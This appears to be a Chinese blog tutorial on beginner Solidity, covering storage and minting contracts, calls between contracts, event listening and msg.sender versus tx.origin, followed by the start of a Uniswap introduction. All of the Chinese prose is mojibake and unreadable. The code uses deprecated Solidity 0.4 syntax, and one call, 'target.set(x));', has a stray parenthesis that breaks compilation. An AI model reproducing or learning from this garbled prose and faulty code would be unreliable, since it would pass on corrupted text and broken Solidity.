<p>ç¬¬ä¸€è¡Œå°±æ˜¯å‘Šè¯‰å¤§å®¶æºä»£ç ä½¿ç”¨Solidityç‰ˆæœ¬0.4.0å†™çš„ï¼Œå¹¶ä¸”ä½¿ç”¨0.4.0ä»¥ä¸Šç‰ˆæœ¬è¿è¡Œä¹Ÿæ²¡é—®é¢˜ï¼ˆæœ€é«˜åˆ°0.5.0ï¼Œä½†æ˜¯ä¸åŒ…å«0.5.0ï¼‰ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿åˆçº¦ä¸ä¼šåœ¨æ–°çš„ç¼–è¯‘å™¨ç‰ˆæœ¬ä¸­çªç„¶è¡Œä¸ºå¼‚å¸¸ã€‚å…³é”®å­— <code>pragma</code> çš„å«ä¹‰æ˜¯ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œpragmasï¼ˆç¼–è¯‘æŒ‡ä»¤ï¼‰æ˜¯å‘ŠçŸ¥ç¼–è¯‘å™¨å¦‚ä½•å¤„ç†æºä»£ç çš„æŒ‡ä»¤çš„ï¼ˆä¾‹å¦‚ï¼Œ <a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Pragma_once">pragma once</a> ï¼‰ã€‚</p>
<p>Solidityä¸­åˆçº¦çš„å«ä¹‰å°±æ˜¯ä¸€ç»„ä»£ç ï¼ˆå®ƒçš„ <em>å‡½æ•°</em> )å’Œæ•°æ®ï¼ˆå®ƒçš„ <em>çŠ¶æ€</em> ï¼‰ï¼Œå®ƒä»¬ä½äºä»¥å¤ªåŠåŒºå—é“¾çš„ä¸€ä¸ªç‰¹å®šåœ°å€ä¸Šã€‚ </p>
<p>è¿™ä¸ªåˆçº¦ä¸­æœ‰ä¸‰ä¸ªå‡½æ•°ï¼Œfé€†åºè¿”å›å‚æ•°ä¸­çš„ä¸¤ä¸ªå€¼ï¼›gè°ƒç”¨fï¼›hè®¡ç®—ä¸¤ä¸ªæ•°å­—çš„å’Œã€‚</p>
<ol start="2">
<li>å­˜å‚¨</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData;</span><br><span class="line"></span><br><span class="line">    function set(uint x) public &#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get() public view returns (uint) &#123;</span><br><span class="line">        return storedData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»£ç è¡Œ <code>uint</code> <code>storedData;</code> å£°æ˜ä¸€ä¸ªç±»å‹ä¸º <code>uint</code> (256ä½æ— ç¬¦å·æ•´æ•°ï¼‰çš„çŠ¶æ€å˜é‡ï¼Œå«åš <code>storedData</code> ã€‚ ä½ å¯ä»¥è®¤ä¸ºå®ƒæ˜¯æ•°æ®åº“é‡Œçš„ä¸€ä¸ªä½ç½®ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨ç®¡ç†æ•°æ®åº“ä»£ç çš„å‡½æ•°è¿›è¡ŒæŸ¥è¯¢å’Œå˜æ›´ã€‚å¯¹äºä»¥å¤ªåŠæ¥è¯´ï¼Œä¸Šè¿°çš„åˆçº¦å°±æ˜¯æ‹¥æœ‰åˆçº¦ï¼ˆowning contractï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‡½æ•° <code>set</code> å’Œ <code>get</code> å¯ä»¥ç”¨æ¥å˜æ›´æˆ–å–å‡ºå˜é‡çš„å€¼ã€‚</p>
<p>è¦è®¿é—®ä¸€ä¸ªçŠ¶æ€å˜é‡ï¼Œå¹¶ä¸éœ€è¦åƒ <code>this.</code> è¿™æ ·çš„å‰ç¼€ï¼Œè™½ç„¶è¿™æ˜¯å…¶ä»–è¯­è¨€å¸¸è§çš„åšæ³•ã€‚</p>
<p>è¯¥åˆçº¦èƒ½å®Œæˆçš„äº‹æƒ…å¹¶ä¸å¤šï¼ˆç”±äºä»¥å¤ªåŠæ„å»ºçš„åŸºç¡€æ¶æ„çš„åŸå› ï¼‰ï¼šå®ƒèƒ½å…è®¸ä»»ä½•äººåœ¨åˆçº¦ä¸­å­˜å‚¨ä¸€ä¸ªå•ç‹¬çš„æ•°å­—ï¼Œå¹¶ä¸”è¿™ä¸ªæ•°å­—å¯ä»¥è¢«ä¸–ç•Œä¸Šä»»ä½•äººè®¿é—®ï¼Œä¸”æ²¡æœ‰å¯è¡Œçš„åŠæ³•é˜»æ­¢ä½ å‘å¸ƒè¿™ä¸ªæ•°å­—ã€‚å½“ç„¶ï¼Œä»»ä½•äººéƒ½å¯ä»¥å†æ¬¡è°ƒç”¨ <code>set</code> ï¼Œä¼ å…¥ä¸åŒçš„å€¼ï¼Œè¦†ç›–ä½ çš„æ•°å­—ï¼Œä½†æ˜¯è¿™ä¸ªæ•°å­—ä»ä¼šè¢«å­˜å‚¨åœ¨åŒºå—é“¾çš„å†å²è®°å½•ä¸­ã€‚éšåï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°æ€æ ·æ–½åŠ è®¿é—®é™åˆ¶ï¼Œä»¥ç¡®ä¿åªæœ‰ä½ æ‰èƒ½æ”¹å˜è¿™ä¸ªæ•°å­—ã€‚</p>
<ol start="3">
<li>ä»¥ä¸Šæ˜¯å•ä¸ªåˆçº¦ã€‚é‚£æˆ‘ä»¬æ¥è¯•ä¸€ä¸‹åœ¨ä¸åŒçš„åˆçº¦ä¹‹ä¸­è¿›è¡Œäº¤äº’ã€‚(test_<em>send.solå’Œsimple_set.sol</em>)</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">//import &#x27;test_send.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData;</span><br><span class="line">    function set(uint x) public&#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line">    function get() public constant returns (uint retVal) &#123;</span><br><span class="line">        return storedData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleSet &#123;</span><br><span class="line"></span><br><span class="line">	address instance_address = 0x9351ca1b4cc9c3d11db77374de3987b5abf3d4c8;</span><br><span class="line">	SimpleStorage target = SimpleStorage(instance_address);</span><br><span class="line">    uint readData;</span><br><span class="line">	</span><br><span class="line">    function read() public view returns (uint) &#123;</span><br><span class="line">        readData = target.get();</span><br><span class="line">		return readData;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    function write(uint x) &#123;</span><br><span class="line">        target.set(x));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨simple_setä¸­ï¼Œå¯ä»¥è°ƒç”¨å¹¶ä¿®æ”¹å¦å¤–ä¸€ä¸ªåˆçº¦ä¸­çš„æ•°æ®ã€‚ä¸‹å›¾å±•ç¤ºçš„æ˜¯å…ˆé€šè¿‡simple_setä¿®æ”¹storeDataçš„å€¼ï¼Œç„¶ååœ¨simpleStorageä¸­å»è¯»å–ï¼Œç»“æœæ˜¾ç¤ºäº†å˜åŒ–ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233112.jpg" alt="img"></p>
<ol start="4">
<li>é“¸å¸(coin_mint.sol)</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Coin &#123;</span><br><span class="line"></span><br><span class="line">//å…³é”®å­—â€œpublicâ€ä½¿å˜é‡èƒ½ä»åˆçº¦å¤–éƒ¨è®¿é—®ã€‚</span><br><span class="line">    address public minter;</span><br><span class="line">    mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">//äº‹ä»¶è®©è½»å®¢æˆ·ç«¯èƒ½é«˜æ•ˆçš„å¯¹å˜åŒ–åšå‡ºååº”ã€‚</span><br><span class="line">    event Sent(address from, address to, uint amount);</span><br><span class="line"></span><br><span class="line">//è¿™ä¸ªæ„é€ å‡½æ•°çš„ä»£ç ä»…ä»…åªåœ¨åˆçº¦åˆ›å»ºçš„æ—¶å€™è¢«è¿è¡Œã€‚</span><br><span class="line">    function Coin() &#123;</span><br><span class="line">        minter = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function mint(address receiver, uint amount) &#123;</span><br><span class="line">        if (msg.sender != minter) return;</span><br><span class="line">        balances[receiver] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">    function send(address receiver, uint amount) &#123;</span><br><span class="line">        if (balances[msg.sender] &lt; amount) return;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[receiver] += amount;</span><br><span class="line">        Sent(msg.sender, receiver, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªåˆçº¦å¼•å…¥äº†ä¸€äº›æ–°çš„æ¦‚å¿µï¼Œè®©æˆ‘ä»¬é€ä¸€è§£è¯»ã€‚</p>
<p><code>address</code> <code>public</code> <code>minter;</code> è¿™ä¸€è¡Œå£°æ˜äº†ä¸€ä¸ªå¯ä»¥è¢«å…¬å¼€è®¿é—®çš„ <code>address</code> ç±»å‹çš„çŠ¶æ€å˜é‡ã€‚ <code>address</code> ç±»å‹æ˜¯ä¸€ä¸ª160ä½çš„å€¼ï¼Œä¸”ä¸å…è®¸ä»»ä½•ç®—æ•°æ“ä½œã€‚è¿™ç§ç±»å‹é€‚åˆå­˜å‚¨åˆçº¦åœ°å€æˆ–å¤–éƒ¨äººå‘˜çš„å¯†é’¥å¯¹ã€‚å…³é”®å­— <code>public</code> è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå‡½æ•°ï¼Œå…è®¸ä½ åœ¨è¿™ä¸ªåˆçº¦ä¹‹å¤–è®¿é—®è¿™ä¸ªçŠ¶æ€å˜é‡çš„å½“å‰å€¼ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ªå…³é”®å­—ï¼Œå…¶ä»–çš„åˆçº¦æ²¡æœ‰åŠæ³•è®¿é—®è¿™ä¸ªå˜é‡ã€‚ç”±ç¼–è¯‘å™¨ç”Ÿæˆçš„å‡½æ•°çš„ä»£ç å¤§è‡´å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">function minter() returns (address) &#123; return minter; &#125;</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶ï¼ŒåŠ ä¸€ä¸ªå’Œä¸Šé¢å®Œå…¨ä¸€æ ·çš„å‡½æ•°æ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸ºæˆ‘ä»¬ä¼šæœ‰åŒåçš„ä¸€ä¸ªå‡½æ•°å’Œä¸€ä¸ªå˜é‡ï¼Œè¿™é‡Œï¼Œä¸»è¦æ˜¯å¸Œæœ›ä½ èƒ½æ˜ç™½â€”â€”ç¼–è¯‘å™¨å·²ç»å¸®ä½ å®ç°äº†ã€‚</p>
<p>ä¸‹ä¸€è¡Œï¼Œ </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">mapping (address =&gt; uint) public balances; </span><br></pre></td></tr></table></figure>

<p>ä¹Ÿåˆ›å»ºä¸€ä¸ªå…¬å…±çŠ¶æ€å˜é‡ï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªæ›´å¤æ‚çš„æ•°æ®ç±»å‹ã€‚ è¯¥ç±»å‹å°†addressæ˜ å°„ä¸ºæ— ç¬¦å·æ•´æ•°ã€‚ Mappings å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ª <a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Hash_table">å“ˆå¸Œè¡¨</a> å®ƒä¼šæ‰§è¡Œè™šæ‹Ÿåˆå§‹åŒ–ï¼Œä»¥ä½¿æ‰€æœ‰å¯èƒ½å­˜åœ¨çš„é”®éƒ½æ˜ å°„åˆ°ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºä¸ºå…¨é›¶çš„å€¼ã€‚ ä½†æ˜¯ï¼Œè¿™ç§ç±»æ¯”å¹¶ä¸å¤ªæ°å½“ï¼Œå› ä¸ºå®ƒæ—¢ä¸èƒ½è·å¾—æ˜ å°„çš„æ‰€æœ‰é”®çš„åˆ—è¡¨ï¼Œä¹Ÿä¸èƒ½è·å¾—æ‰€æœ‰å€¼çš„åˆ—è¡¨ã€‚ å› æ­¤ï¼Œè¦ä¹ˆè®°ä½ä½ æ·»åŠ åˆ°mappingä¸­çš„æ•°æ®ï¼ˆä½¿ç”¨åˆ—è¡¨æˆ–æ›´é«˜çº§çš„æ•°æ®ç±»å‹ä¼šæ›´å¥½ï¼‰ï¼Œè¦ä¹ˆåœ¨ä¸éœ€è¦é”®åˆ—è¡¨æˆ–å€¼åˆ—è¡¨çš„ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨å®ƒï¼Œå°±å¦‚æœ¬ä¾‹ã€‚ è€Œç”± <code>public</code> å…³é”®å­—åˆ›å»ºçš„getterå‡½æ•° <a href="https://link.zhihu.com/?target=https://solidity-cn.readthedocs.io/zh/develop/contracts.html%23getter-functions">getter function</a> åˆ™æ˜¯æ›´å¤æ‚ä¸€äº›çš„æƒ…å†µï¼Œ å®ƒå¤§è‡´å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">function balances(address _account) public view returns (uint) &#123; return balances[_account]; &#125;</span><br></pre></td></tr></table></figure>

<p>æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œä½ å¯ä»¥é€šè¿‡è¯¥å‡½æ•°è½»æ¾åœ°æŸ¥è¯¢åˆ°è´¦æˆ·çš„ä½™é¢ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">event Sent(address from, address to, uint amount); </span><br></pre></td></tr></table></figure>

<p>è¿™è¡Œå£°æ˜äº†ä¸€ä¸ªæ‰€è°“çš„â€œäº‹ä»¶ï¼ˆeventï¼‰â€ï¼Œå®ƒä¼šåœ¨ <code>send</code> å‡½æ•°çš„æœ€åä¸€è¡Œè¢«å‘å‡ºã€‚ç”¨æˆ·ç•Œé¢ï¼ˆå½“ç„¶ä¹ŸåŒ…æ‹¬æœåŠ¡å™¨åº”ç”¨ç¨‹åºï¼‰å¯ä»¥ç›‘å¬åŒºå—é“¾ä¸Šæ­£åœ¨å‘é€çš„äº‹ä»¶ï¼Œè€Œä¸ä¼šèŠ±è´¹å¤ªå¤šæˆæœ¬ã€‚ä¸€æ—¦å®ƒè¢«å‘å‡ºï¼Œç›‘å¬è¯¥äº‹ä»¶çš„listeneréƒ½å°†æ”¶åˆ°é€šçŸ¥ã€‚è€Œæ‰€æœ‰çš„äº‹ä»¶éƒ½åŒ…å«äº† <code>from</code> ï¼Œ <code>to</code> å’Œ <code>amount</code> ä¸‰ä¸ªå‚æ•°ï¼Œå¯æ–¹ä¾¿è¿½è¸ªäº‹åŠ¡ã€‚ ä¸ºäº†ç›‘å¬è¿™ä¸ªäº‹ä»¶ï¼Œä½ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Coin.Sent().watch(&#123;&#125;, &#x27;&#x27;, function(error, result) &#123;</span><br><span class="line">    if (!error) &#123;</span><br><span class="line">        console.log(&quot;Coin transfer: &quot; + result.args.amount +</span><br><span class="line">            &quot; coins were sent from &quot; + result.args.from +</span><br><span class="line">            &quot; to &quot; + result.args.to + &quot;.&quot;);</span><br><span class="line">        console.log(&quot;Balances now:\n&quot; +</span><br><span class="line">            &quot;Sender: &quot; + Coin.balances.call(result.args.from) +</span><br><span class="line">            &quot;Receiver: &quot; + Coin.balances.call(result.args.to));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¯·æ³¨æ„è‡ªåŠ¨ç”Ÿæˆçš„ <code>balances</code> å‡½æ•°æ˜¯å¦‚ä½•ä»ç”¨æˆ·ç•Œé¢è°ƒç”¨çš„ã€‚</p>
<p>ç‰¹æ®Šå‡½æ•° <code>Coin</code> æ˜¯åœ¨åˆ›å»ºåˆçº¦æœŸé—´è¿è¡Œçš„æ„é€ å‡½æ•°ï¼Œä¸èƒ½åœ¨äº‹åè°ƒç”¨ã€‚ å®ƒæ°¸ä¹…å­˜å‚¨åˆ›å»ºåˆçº¦çš„äººçš„åœ°å€: <code>msg</code> (ä»¥åŠ <code>tx</code> å’Œ <code>block</code> ) æ˜¯ä¸€ä¸ªç¥å¥‡çš„å…¨å±€å˜é‡ï¼Œå…¶ä¸­åŒ…å«ä¸€äº›å…è®¸è®¿é—®åŒºå—é“¾çš„å±æ€§ã€‚ <code>msg.sender</code> å§‹ç»ˆæ˜¯å½“å‰ï¼ˆå¤–éƒ¨ï¼‰å‡½æ•°è°ƒç”¨çš„æ¥æºåœ°å€ã€‚</p>
<p>æœ€åï¼ŒçœŸæ­£è¢«ç”¨æˆ·æˆ–å…¶ä»–åˆçº¦æ‰€è°ƒç”¨çš„ï¼Œä»¥å®Œæˆæœ¬åˆçº¦åŠŸèƒ½çš„æ–¹æ³•æ˜¯ <code>mint</code> å’Œ <code>send</code>ã€‚ å¦‚æœ <code>mint</code> è¢«åˆçº¦åˆ›å»ºè€…å¤–çš„å…¶ä»–äººè°ƒç”¨åˆ™ä»€ä¹ˆä¹Ÿä¸ä¼šå‘ç”Ÿã€‚ å¦ä¸€æ–¹é¢ï¼Œ <code>send</code> å‡½æ•°å¯è¢«ä»»ä½•äººç”¨äºå‘ä»–äººå‘é€å¸ (å½“ç„¶ï¼Œå‰ææ˜¯å‘é€è€…æ‹¥æœ‰è¿™äº›å¸)ã€‚è®°ä½ï¼Œå¦‚æœä½ ä½¿ç”¨åˆçº¦å‘é€å¸ç»™ä¸€ä¸ªåœ°å€ï¼Œå½“ä½ åœ¨åŒºå—é“¾æµè§ˆå™¨ä¸ŠæŸ¥çœ‹è¯¥åœ°å€æ—¶æ˜¯çœ‹ä¸åˆ°ä»»ä½•ç›¸å…³ä¿¡æ¯çš„ã€‚å› ä¸ºï¼Œå®é™…ä¸Šä½ å‘é€å¸å’Œæ›´æ”¹ä½™é¢çš„ä¿¡æ¯ä»…ä»…å­˜å‚¨åœ¨ç‰¹å®šåˆçº¦çš„æ•°æ®å­˜å‚¨å™¨ä¸­ã€‚é€šè¿‡ä½¿ç”¨äº‹ä»¶ï¼Œä½ å¯ä»¥éå¸¸ç®€å•åœ°ä¸ºä½ çš„æ–°å¸åˆ›å»ºä¸€ä¸ªâ€œåŒºå—é“¾æµè§ˆå™¨â€æ¥è¿½è¸ªäº¤æ˜“å’Œä½™é¢ã€‚</p>
<p>è¿™ä»½åˆçº¦è¿›è¡Œæ“ä½œï¼Œè­¬å¦‚é€šè¿‡è´¦æˆ·7578Cå°†åˆçº¦éƒ¨ç½²åˆ°é“¾ä¸Šï¼Œé‚£ä¹ˆå¯ä»¥æŸ¥çœ‹åˆçº¦çš„minterï¼›minterå¯ä»¥è‡ªå·±é“¸å¸ï¼Œç›¸å½“äºæ˜¯å‘ç»™ä»»ä½•ç”¨æˆ·ä¸€äº›å¸ï¼›æœ‰å¸çš„ç”¨æˆ·åˆå¯ä»¥è¿›è¡Œè½¬è´¦ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233113.jpg" alt="img"></p>
<ol start="5">
<li>å¤æ‚çš„æ•°æ®ç±»å‹ ï¼ˆorigin_send.solï¼‰</li>
</ol>
<p>msg.senderå’Œtx.origin</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Demo2&#123;</span><br><span class="line">    Demo demo222;</span><br><span class="line">    function Demo2(address aimAddr) &#123;</span><br><span class="line">        demo222 = Demo(aimAddr);</span><br><span class="line">    &#125;</span><br><span class="line">    function exp()&#123;</span><br><span class="line">        demo222.a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tx.origin</code>æ˜¯ä¸€ä¸ªaddressç±»å‹ï¼Œè¡¨ç¤ºäº¤æ˜“çš„å‘é€è€…ï¼Œ<code>msg.sender</code>åˆ™è¡¨ç¤ºä¸ºæ¶ˆæ¯çš„å‘é€è€…ã€‚åœ¨åŒä¸€ä¸ªåˆçº¦ä¸­ï¼Œä»–ä»¬æ˜¯ç­‰ä»·çš„ã€‚ä½†æ˜¯åœ¨ä¸åŒåˆçº¦ä¸­ï¼Œ<code>tx.origin</code>è¡¨ç¤ºç”¨æˆ·åœ°å€ï¼Œ<code>msg.sender</code>åˆ™è¡¨ç¤ºåˆçº¦åœ°å€ã€‚</p>
<p>ä¸Šè¿°ä»£ç ä¸­æœ‰ä¸¤ä¸ªåˆçº¦ï¼Œéœ€è¦åˆ†åˆ«éƒ¨ç½²ã€‚å¹¶ä¸”demo2åœ¨éƒ¨ç½²æ—¶éœ€è¦ä¼ å…¥å‚æ•°ã€‚</p>
<p>åœ¨demoä¸­:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233115.jpg" alt="img"></p>
<p>åœ¨demo2ä¸­ï¼Œ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233116.jpg" alt="img"></p>
<p>è€Œä¸‹é¢çš„åœ°å€7578å°±æ˜¯demoåˆçº¦éƒ¨ç½²çš„åœ°å€ï¼Œ7D5bå°±æ˜¯demo2åˆçº¦éƒ¨ç½²çš„åœ°å€ã€‚</p>
<p>ä½¿ç”¨<code>msg.sender</code>çš„æ‰€æœ‰è€…å¯èƒ½æ˜¯ä¸€ä¸ªåˆçº¦ã€‚</p>
<p>ä½¿ç”¨<code>tx.origin</code>çš„æ‰€æœ‰è€…æ°¸è¿œä¸å¯èƒ½æ˜¯åˆçº¦ã€‚</p>
<p>åœ¨ç®€å•çš„è°ƒç”¨é“¾A-&gt; B-&gt; C-&gt; Dä¸­ï¼Œå†…éƒ¨D çš„<code>msg.sender</code>ä¸ºCï¼Œ<code>tx.origin</code>ä¸ºA.</p>
<p>å°±çµæ´»æ€§è€Œè¨€é¦–é€‰<code>msg.sender</code>ã€‚æ­¤å¤–ï¼Œå¯¹äºSerenityï¼ŒVitalikå»ºè®®é¿å…ä½¿ç”¨tx.originï¼š<a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof">How do I make my DAPP â€œSerenity-Proof?â€</a></p>
<p>å¦‚æœä½ çœŸçš„éœ€è¦ä½¿ç”¨<code>tx.origin</code>ï¼Œè¯·ä¸€å®šè€ƒè™‘ä»”ç»†ã€‚è¯·è®°ä½ï¼Œä½ å¯èƒ½ä¸æ˜¯è¯¥åˆçº¦çš„å”¯ä¸€ç”¨æˆ·ã€‚å…¶ä»–äººä¹Ÿå¯èƒ½æƒ³è¦ä½¿ç”¨ä½ çš„åˆçº¦ï¼Œå¹¶å¸Œæœ›é€šè¿‡ä»–ä»¬ç¼–å†™çš„åˆçº¦ä¸ä¹‹è¿›è¡Œäº’åŠ¨ã€‚</p>
<p>å¦‚æœåœ¨Dä¸­ç¡®å®éœ€è¦å…¶æ¥æº<code>origin</code>ï¼Œé‚£ä¹ˆåˆçº¦Bï¼ŒCï¼ŒDä¸­çš„æ¯ä¸ªå‡½æ•°éƒ½å¯ä»¥é‡‡ç”¨é¢å¤–çš„å‚æ•°æ¥ä¼ æ’­æ¥æºï¼šAå°†å…¶åœ°å€ï¼ˆ<code>this</code>ï¼‰ä¼ é€’ç»™Bï¼ŒBå°†å€¼ä¼ é€’ç»™C ï¼ŒCå°†å®ƒä¼ é€’ç»™D.</p>
<p>å¯ä»¥æŸ¥çœ‹å‚è€ƒ5ï¼Œ è®¨è®ºä½¿ç”¨tx.originå¯èƒ½ä¼šå¼•èµ·çš„æ”»å‡»ã€‚</p>
<p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹addressã€‚</p>
<p>ä»¥å¤ªåŠä¸­çš„åœ°å€çš„é•¿åº¦ä¸º<code>20</code>å­—èŠ‚ï¼Œä¸€å­—èŠ‚ç­‰äº8ä½ï¼Œä¸€å…±<code>160</code>ä½ï¼Œæ‰€ä»¥<code>address</code>å…¶å®äº¦å¯ä»¥ç”¨<code>uint160</code>æ¥å£°æ˜ã€‚</p>
<p>å±æ€§ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>.balance, åœ°å€çš„ä½™é¢ï¼ˆå•ä½ä¸ºï¼šweiï¼‰</span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>.transfer,å‘é€ä»¥å¤ªå¸ï¼ˆå•ä½ä¸ºï¼šweiï¼‰åˆ°ä¸€ä¸ªåœ°å€ï¼Œå¦‚æœå¤±è´¥ä¼šåœæ­¢å¹¶æŠ›å‡ºå¼‚å¸¸ã€‚</span><br></pre></td></tr></table></figure>









<p>å‚è€ƒï¼š</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://wallstreetcn.com/articles/3393395">Fomo3D åƒä¸‡å¤§å¥–è·å¾—è€…â€œç‰¹æ®Šæ”»å‡»æŠ€å·§â€æœ€å…¨æ­éœ² - åå°”è¡—è§é—»</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/4c926fbbdafd">â€œé¦–æ¬¡æ·±åº¦æ­ç§˜â€Fomo3Dï¼Œè¢«é»‘å®¢æ‹¿èµ°çš„2200ä¸‡ï¼</a></li>
<li><a href="https://link.zhihu.com/?target=https://solidity.readthedocs.io/en/v0.5.3/introduction-to-smart-contracts.html">https://solidity.readthedocs.io/en/v0.5.3/introduction-to-smart-contracts.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html">https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/b8bb006a5b68">https://www.jianshu.com/p/b8bb006a5b68</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514">https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/qq_34611579/article/details/85163326">https://blog.csdn.net/qq_34611579&#x2F;article&#x2F;details&#x2F;85163326</a></li>
</ol>
<h1 id="åŒºå—é“¾æŠ€æœ¯15-uniswapç®€ä»‹"><a href="#åŒºå—é“¾æŠ€æœ¯15-uniswapç®€ä»‹" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯15:uniswapç®€ä»‹"></a>åŒºå—é“¾æŠ€æœ¯15:uniswapç®€ä»‹</h1><p>ä¸ºå¸å¼•æ³¨æ„åŠ›ï¼Œå…ˆçœ‹ä¸€ä¸ªæ•°æ®ï¼š</p>
<p>ä»2020å¹´3æœˆ1æ—¥åˆ°3æœˆ25æ—¥ï¼ŒUniswapä¸Šçš„æ€»äº¤æ˜“è§„æ¨¡å¤§çº¦2.06äº¿ç¾å…ƒï¼Œè¿™æœŸé—´æµåŠ¨æ€§æä¾›å•†å¤§çº¦æ•è·äº†60å¤šä¸‡ç¾å…ƒçš„è´¹ç”¨ä»·å€¼ã€‚å…¶ä¸­3æœˆ12æ—¥å’Œ3æœˆ13æ—¥äº¤æ˜“é‡éƒ½è¶…è¿‡3,000ä¸‡ç¾å…ƒï¼Œè´¡çŒ®ä¸‰åˆ†ä¹‹ä¸€çš„æ”¶ç›Šï¼Œå¹³å‡ä¸‹æ¥ï¼Œæ¯å¤©å¤§çº¦å¯ä»¥äº§å‡º24,000ç¾å…ƒçš„æ”¶ç›Šã€‚å‡è®¾è¿™æ˜¯æ—¥å‡çš„è´¹ç”¨ï¼Œé‚£ä¹ˆï¼Œæ‰€æœ‰æµåŠ¨æ€§æä¾›å•†ä¸€å¹´å¯ä»¥èµšå–876ä¸‡ç¾å…ƒæ”¶ç›Šã€‚</p>
<hr>
<p>Uniswapæ˜¯ä¸€ç§åŸºäºä»¥å¤ªåŠçš„åè®®ï¼Œæ—¨åœ¨ä¿ƒè¿›ETHå’ŒERC20 ä»£å¸æ•°å­—èµ„äº§ä¹‹é—´çš„è‡ªåŠ¨å…‘æ¢äº¤æ˜“ã€‚</p>
